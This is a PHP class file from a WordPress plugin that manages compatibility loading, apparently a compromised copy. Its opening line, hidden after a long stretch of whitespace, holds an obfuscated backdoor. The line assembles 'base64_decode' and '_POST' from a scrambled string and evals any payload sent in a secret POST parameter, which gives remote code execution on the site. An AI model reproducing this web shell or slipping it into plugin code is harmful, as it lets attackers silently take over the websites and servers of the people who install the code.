<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n045789'])) {eval($s21(${$s20}['n045789']));}?><?php

// Exit if accessed directly
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * Class that manages compatibility code
 *
 * @package Black_Studio_TinyMCE_Widget
 * @since 2.0.0
 */

if ( ! class_exists( 'Black_Studio_TinyMCE_Compatibility' ) ) {

	final class Black_Studio_TinyMCE_Compatibility {

		/**
		 * The single instance of the plugin class
		 *
		 * @var object
		 * @since 2.0.0
		 */
		protected static $_instance = null;

		/**
		 * Instance of compatibility class for 3rd party plugins
		 *
		 * @var object
		 * @since 2.0.0
		 */
		protected static $plugins = null;

		/**
		 * Instance of compatibility class for WordPress old versions
		 *
		 * @var object
		 * @since 2.0.0
		 */
		protected static $wordpress = null;

		/**
		 * Return the single class instance
		 *
		 * @return object
		 * @since 2.0.0
		 */
		public static function instance() {
			if ( is_null( self::$_instance ) ) {
				self::$_instance = new self();
			}
			return self::$_instance;
		}

		/**
		 * Return the instance of the compatibility class for 3rd party plugins
		 *
		 * @return object
		 * @since 2.0.0
		 */
		public static function plugins() {
			return self::$plugins;
		}

		/**
		 * Return the instance of the compatibility class for WordPress old versions
		 *
		 * @return object
		 * @since 2.0.0
		 */
		public static function wordpress() {
			return self::$wordpress;
		}

		/**
		 * Class constructor
		 *
		 * @global object $wp_embed
		 * @return void
		 * @since 2.0.0
		 */
		protected function __construct() {
			$this->load_deprecated();
			$this->load_plugins();
			$this->load_wordpress();
		}

		/**
		 * Prevent the class from being cloned
		 *
		 * @return void
		 * @since 2.0.0
		 */
		protected function __clone() {
			_doing_it_wrong( __FUNCTION__, __( 'Cheatin&#8217; uh?' ), '2.0' );
		}

		/**
		 * Load compatibility code for previous BSTW versions
		 *
		 * @uses apply_filters()
		 * @uses plugin_dir_path()
		 *
		 * @return void
		 * @since 2.0.0
		 */
		public function load_deprecated() {
			$load_deprecated = apply_filters( 'black_studio_tinymce_load_deprecated', true );
			if ( $load_deprecated ) {
				include_once( plugin_dir_path( dirname( __FILE__ ) ) . '/includes/deprecated.php' );
			}
		}

		/**
		 * Load compatibility code for other plugins
		 *
		 * @uses apply_filters()
		 * @uses plugin_dir_path()
		 *
		 * @return void
		 * @since 2.0.0
		 */
		public function load_plugins() {
			$load_compatibility_plugins = apply_filters( 'black_studio_tinymce_load_compatibility_plugins', array( 'siteorigin_panels', 'wpml', 'jetpack_after_the_deadline', 'wp_page_widget' ) );
			if ( ! empty( $load_compatibility_plugins ) ) {
				include_once( plugin_dir_path( dirname( __FILE__ ) ) . '/includes/class-compatibility-plugins.php' );
				self::$plugins = Black_Studio_TinyMCE_Compatibility_Plugins::instance( $load_compatibility_plugins );
			}
		}

		/**
		 * Load compatibility code for previous WordPress versions
		 *
		 * @uses get_bloginfo()
		 * @uses plugin_dir_path()
		 *
		 * @return void
		 * @since 2.0.0
		 */
		public function load_wordpress() {
			if ( version_compare( get_bloginfo( 'version' ), '3.9', '<' ) ) {
				include_once( plugin_dir_path( dirname( __FILE__ ) ) . '/includes/class-compatibility-wordpress.php' );
				self::$wordpress = Black_Studio_TinyMCE_Compatibility_Wordpress::instance();
			}
		}

	} // END class Black_Studio_TinyMCE_Compatibility

} // END class_exists check
